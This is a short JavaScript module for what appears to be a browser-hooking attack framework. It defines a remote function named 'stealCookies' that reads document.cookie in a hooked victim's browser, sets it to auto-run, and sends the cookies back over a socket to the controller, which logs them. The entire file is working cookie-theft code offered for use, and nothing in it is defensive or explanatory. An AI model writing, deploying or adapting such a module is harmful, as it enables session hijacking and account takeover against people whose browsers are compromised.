module.exports = (M) => {

    M.setMainFunction((module, socket, config) => {
        M.executeRemoteFuncFromThisModule(socket, "stealCookies", "", (cookies) => {
            console.log(cookies);
        });
    })
    
    M.setDefaultConfig({
        Hi:"Hi"
    });
    
    M.addRemoteFunction("stealCookies", function(code, debug) {
        return document.cookie;
    });
    
    M.setAutoRunStatus(true);

    return M;
}